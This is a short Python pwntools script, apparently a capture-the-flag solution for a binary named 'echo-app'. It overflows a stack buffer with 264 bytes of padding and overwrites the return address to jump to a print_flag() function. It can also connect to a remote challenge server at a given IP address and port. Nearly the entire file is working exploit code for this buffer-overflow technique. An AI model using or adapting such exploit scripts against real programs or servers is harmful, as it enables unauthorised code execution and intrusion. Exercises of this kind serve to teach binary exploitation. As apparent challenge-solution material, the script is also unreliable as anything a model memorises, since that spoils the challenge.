#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("echo-app")

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    if args.REMOTE:
        return remote("54.85.45.101", 8008)
    else:
        return process(elf.path)

# Plan:
# Overwrite ret addr with print_flag()

# Addresses
offset = b"A"*264

# Functions

io = start()

p = offset + p64(elf.sym['print_flag'])

io.sendlineafter(b"ECHO! Echo! echo!", p)


io.interactive()
